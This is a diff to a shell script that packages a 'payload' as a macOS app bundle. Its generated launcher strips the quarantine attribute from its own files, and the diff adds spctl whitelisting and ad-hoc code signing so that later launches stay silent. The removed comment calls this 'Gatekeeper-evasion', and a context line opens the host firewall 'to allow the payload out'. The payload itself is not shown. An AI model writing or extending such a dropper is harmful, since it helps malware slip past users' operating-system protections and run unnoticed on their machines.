@@ -51,12 +51,17 @@ PLIST
 
 cat > "$OUT_APP/Contents/MacOS/launcher" <<LAUNCH
 #!/bin/sh
-# Gatekeeper-evasion: clear the quarantine xattr on our own bundle so later
-# launches are silent. No chmod / no ./payload needed — Finder runs this.
+# macOS Gatekeeper: ad-hoc signing does NOT satisfy Gatekeeper for quarantined
+# browser downloads, so the first launch may show a blocking dialog. We strip
+# quarantine and attempt a system policy whitelist (spctl --add needs root;
+# fails gracefully without it). After one user right-click -> Open approval (or
+# a root spctl --add via install-daemon.sh), later launches are silent.
 SELF="\$(cd "\$(dirname "\$0")" && pwd)"
 ROOT="\$(cd "\$SELF/../.." && pwd)"
 xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
 xattr -dr com.apple.quarantine "\$SELF/${EXEC_NAME}" 2>/dev/null || true
+spctl --add "$ROOT" >/dev/null 2>&1 || true
+spctl --add "$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
 
 # preconfigure the host firewall to allow the payload out (best effort).
 SFW=/usr/libexec/ApplicationFirewall/socketfilterfw
@@ -100,6 +105,7 @@ chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"
 
 if command -v codesign >/dev/null 2>&1; then
   codesign --force -s - "$OUT_APP/Contents/MacOS/$EXEC_NAME" >/dev/null 2>&1 || true
+  codesign --force -s - "$OUT_APP/Contents/MacOS/launcher" >/dev/null 2>&1 || true
   codesign --force -s - "$OUT_APP" >/dev/null 2>&1 || true
 fi
 
